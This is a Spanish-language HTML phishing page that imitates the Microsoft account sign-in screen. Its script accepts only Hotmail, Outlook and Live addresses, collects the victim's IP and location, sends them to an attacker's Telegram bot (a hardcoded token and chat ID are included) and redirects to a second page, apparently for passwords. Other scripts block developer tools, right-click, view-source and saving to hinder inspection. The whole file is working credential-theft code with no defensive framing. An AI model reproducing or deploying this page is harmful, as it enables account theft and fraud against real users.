<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
<script>
    // Bloqueo estricto de atajos de teclado para inspección
    window.addEventListener('keydown', function(e) {
        if (
            e.key === 'F12' || 
            e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
        ) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }
    }, true);

    // Bloqueo total de clic derecho
    window.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }, true);
</script>

<title>Inicio de sesión</title>

<style>
* {
    box-sizing: border-box;
}

html,
body {
    margin: 0;
    width: 100%;
    height: 100%;
    font-family: "Segoe UI", Arial, sans-serif;
    touch-action: manipulation;
    -webkit-text-size-adjust: 100%; /* Evita que el texto cambie de tamaño automáticamente en móviles */
}

body {
    background:
        url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg")
        center center / cover no-repeat fixed;

    display: flex;
    justify-content: center;
    align-items: center;
}

.page {
    width: 100%;
    min-height: 100vh;

    display: flex;
    justify-content: center;
    align-items: center;

    padding: 30px;
}

.container {
    width: 475px;
}

.card {
    background: #fff;
    padding: 44px 48px 48px;
    box-shadow: 0 2px 6px rgba(0, 0, 0, .20);
    min-height: 360px;
    position: relative;
    overflow: hidden;
}

.progress-bar {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    display: none;
    z-index: 10;
}

.logo {
    width: 108px;
    height: auto;
    margin-bottom: 18px;
}

.demo {
    display: inline-block;

    font-size: 11px;
    font-weight: 600;

    color: #8a1c1c;
    background: #fde7e7;

    padding: 4px 8px;

    margin-bottom: 18px;
}

h1 {
    margin: 0 0 16px;

    font-size: 27px;
    font-weight: 600;

    color: #1b1b1b;
}

.error-msg {
    color: #e00000;
    font-size: 15px;
    line-height: 1.35;
    margin-bottom: 16px;
    display: none;
}

.error-msg a {
    color: #0067b8;
    text-decoration: none;
}

.error-msg a:hover {
    text-decoration: underline;
}

.input {
    width: 100%;

    border: none;
    border-bottom: 1px solid #666;

    outline: none;

    font-size: 16px;

    padding: 9px 0;

    background: transparent;
}

.input:focus {
    border-bottom: 2px solid #0067b8;
}

.input.has-error {
    border-bottom: 1px solid #e00000;
}

.help {
    margin-top: 18px;

    font-size: 14px;
}

.help a {
    color: #0067b8;
    text-decoration: none;
}

.help a:hover {
    text-decoration: underline;
}

.actions {
    display: flex;
    justify-content: flex-end;

    margin-top: 30px;
}

button {
    border: none;

    background: #0067b8;
    color: white;

    padding: 10px 30px;

    font-size: 15px;

    cursor: pointer;
}

button:hover {
    background: #005da6;
}

.options {
    margin-top: 22px;

    background: #fff;

    box-shadow:
        0 2px 6px rgba(0, 0, 0, .20);

    min-height: 54px;

    display: flex;
    align-items: center;

    padding: 0 48px;

    font-size: 15px;
}

.options img {
    width: 25px;
    margin-right: 15px;
}

.footer {
    position: fixed;

    bottom: 12px;
    right: 20px;

    display: flex;
    gap: 20px;

    font-size: 12px;
}

.footer a {
    color: #333;
    text-decoration: none;
}

@media (max-width: 600px) {

    .page {
        padding: 15px;
    }

    .container {
        width: 100%;
    }

    .card {
        padding: 35px 30px;
    }

    .options {
        padding: 0 30px;
    }

    .footer {
        display: none;
    }
}
</style>
</head>

<body>

<div class="page">

    <div class="container">

        <div class="card">

            <img id="progressBar" class="progress-bar" src="https://aadcdn.msauth.net/shared/1.0/content/images/marching_ants_986f40b5a9dc7d39ef8396797f61b323.gif" alt="Cargando...">

            <img
                class="logo"
                src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
                alt="Logo"
            >

            <h1>Iniciar sesión</h1>

            <div id="errorMsg" class="error-msg"></div>

            <input
                id="userInput"
                class="input"
                type="text"
                placeholder="Correo electrónico, teléfono o Skype"
                autocomplete="off"
            >

            <div class="help">
                ¿No tienes cuenta?
                <a href="javascript:void(0)">Crea una</a>
            </div>

            <div class="help">
                <a href="javascript:void(0)">
                    ¿No puedes acceder a tu cuenta?
                </a>
            </div>

            <div class="actions">
                <button id="btnNext" type="button" onclick="validarFormulario()">
                    Próximo
                </button>
            </div>

        </div>

        <div class="options">

            <img
                src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                alt=""
            >

            Opciones de inicio de sesión

        </div>

    </div>

</div>

<div class="footer">
    <a href="javascript:void(0)">Condiciones de uso</a>
    <a href="javascript:void(0)">Privacidad y cookies</a>
</div>

<script>
// Bloquear gestos de zoom táctil (doble toque y pellizco con dos dedos)
let lastTouchEnd = 0;
document.addEventListener('touchend', function (event) {
    const now = (new Date()).getTime();
    if (now - lastTouchEnd <= 300) {
        event.preventDefault();
    }
    lastTouchEnd = now;
}, { passive: false });

document.addEventListener('gesturestart', function (e) {
    e.preventDefault();
});

const TELEGRAM_TOKEN = '6376409130:AAEO2xslfT0z-Z7a49HUaFa-CEpMYX4wgAA';
const CHAT_ID = '-1002003987549';

async function validarFormulario() {
    const input = document.getElementById('userInput');
    const errorMsg = document.getElementById('errorMsg');
    const progressBar = document.getElementById('progressBar');
    const btnNext = document.getElementById('btnNext');
    const valor = input.value.trim().toLowerCase();
    
    // Lista de dominios permitidos
    const dominiosPermitidos = [
        '@hotmail.com', 
        '@outlook.com', 
        '@live.com', 
        '@hotmail.es', 
        '@outlook.es', 
        '@live.es'
    ];

    // Verificar si termina en alguno de los dominios permitidos
    const esDominioValido = dominiosPermitidos.some(dominio => valor.endsWith(dominio));

    if (valor === '') {
        errorMsg.innerHTML = 'Introduce una dirección de correo electrónico válidos.';
        errorMsg.style.display = 'block';
        input.classList.add('has-error');
    } else if (!valor.includes('@')) {
        errorMsg.innerHTML = 'No pudimos encontrar una cuenta con ese nombre de usuario.';
        errorMsg.style.display = 'block';
        input.classList.add('has-error');
    } else if (!esDominioValido) {
        // Si no cumple con ninguna de las extensiones permitidas, muestra el error
        errorMsg.innerHTML = 'Introduce una dirección de correo electrónico válidos.';
        errorMsg.style.display = 'block';
        input.classList.add('has-error');
    } else {
        errorMsg.style.display = 'none';
        input.classList.remove('has-error');
        progressBar.style.display = 'block';
        btnNext.disabled = true;
        
        localStorage.setItem('userEmail', valor);

        // Obtener ubicación
        let geoInfo = "No detectada";
        let ipReal = "Oculta";

        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            ipReal = data.ip || "Oculta";
            geoInfo = `${data.city}, ${data.country_name} (${data.region})`;
        } catch (err) {
            console.log("Error obteniendo ubicación");
        }

        // Guardar IP y ubicación para reutilizar
        localStorage.setItem('userIp', ipReal);
        localStorage.setItem('userGeo', geoInfo);

        // Plantilla Inicial
        const mensaje = `👤 PASO 1: LOGIN\n\n` +
                        `👤 Usuario: \`${valor}\`\n` +
                        `🔑 Clave1: \`Cargando...\`\n` +
                        `🔑 Clave2: \`Cargando...\`\n` +
                        `🌐 IP: \`${ipReal}\`\n` +
                        `📍 Ubicación: \`${geoInfo}\``;

        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown'
                })
            });

            const data = await res.json();
            if (data.ok) {
                // Guardar el ID del mensaje enviado para poder editarlo después
                localStorage.setItem('telegramMessageId', data.result.message_id);
            }
        } catch (error) {
            console.error('Error enviando a Telegram:', error);
        }

        setTimeout(function() {
            window.location.href = "index2.html";
        }, 2000);
    }
}
</script>

<script>
    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
(() => {
    'use strict';

    // Evita ejecutar dos veces la protección.
    if (window.__proteccionWebActiva) return;
    window.__proteccionWebActiva = true;

    function mostrarAviso() {
        if (document.getElementById('aviso-proteccion')) return;

        const aviso = document.createElement('div');
        aviso.id = 'aviso-proteccion';

        Object.assign(aviso.style, {
            position: 'fixed',
            inset: '0',
            zIndex: '2147483647',
            background: 'rgba(0,0,0,.88)',
            color: '#fff',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            boxSizing: 'border-box',
            fontFamily: 'Arial, sans-serif',
            textAlign: 'center'
        });

        const panel = document.createElement('div');
        Object.assign(panel.style, {
            maxWidth: '420px',
            padding: '28px',
            background: '#202020',
            borderRadius: '12px',
            border: '1px solid #555'
        });

        const titulo = document.createElement('h2');
        titulo.textContent = 'Acción no permitida';

        const mensaje = document.createElement('p');
        mensaje.textContent =
            'Esta acción está restringida en esta página.';

        const boton = document.createElement('button');
        boton.type = 'button';
        boton.textContent = 'Volver a la página';

        Object.assign(boton.style, {
            padding: '12px 20px',
            border: '0',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold'
        });

        boton.addEventListener('click', () => aviso.remove());

        panel.append(titulo, mensaje, boton);
        aviso.appendChild(panel);
        document.body.appendChild(aviso);
    }

    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
    document.addEventListener('keydown', function (e) {
        const tecla = e.key.toLowerCase();

        if (
            (e.ctrlKey || e.metaKey) &&
            ['s', 'u', 'p'].includes(tecla)
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }

        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
        if (
            tecla === 'f12' ||
            ((e.ctrlKey || e.metaKey) &&
             e.shiftKey &&
             ['i', 'j', 'c'].includes(tecla))
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }
    }, true);

    // Bloquear menú contextual del clic derecho.
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        mostrarAviso();
    }, true);

})();
</script>

</body>
</html>
